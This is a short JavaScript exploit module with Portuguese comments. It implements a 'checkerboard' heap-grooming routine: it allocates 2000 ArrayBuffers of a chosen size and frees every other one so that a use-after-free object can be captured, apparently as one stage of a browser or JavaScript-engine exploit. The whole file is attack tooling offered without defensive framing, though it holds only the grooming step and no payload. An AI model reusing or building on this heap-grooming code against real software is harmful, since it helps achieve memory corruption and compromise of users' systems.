import { log } from './utils.mjs';

var grooming_stash = [];

// Estratégia "Checkerboard" (Tabuleiro de Xadrez)
// Aloca: [Ocupado] [Livre] [Ocupado] [Livre]
// Isso fragmenta o Heap de propósito para capturar o objeto UAF.
export function prepare_checkerboard_heap(size) {
    log(`HEAP: Criando padrão Checkerboard para tamanho 0x${size.toString(16)}...`);
    
    try {
        // 1. Alocação Massiva
        let temp_stash = [];
        for (let i = 0; i < 2000; i++) {
            // Usamos ArrayBuffers do tamanho exato que estamos testando
            let ab = new ArrayBuffer(size);
            temp_stash.push(ab);
        }

        // 2. Criar Buracos (Free alternado)
        // Liberamos 1 a cada 2 (ou 3) para criar slots vazios
        for (let i = 0; i < temp_stash.length; i += 2) {
            temp_stash[i] = null; // O GC vai liberar estes slots
        }
        
        // Guardamos o resto para manter a estrutura
        grooming_stash = temp_stash.filter(x => x !== null);
        
        log("HEAP: Padrão criado. Buracos prontos para o UAF.", "success");
    } catch (e) {
        log("HEAP ERRO: " + e, "fail");
    }
}
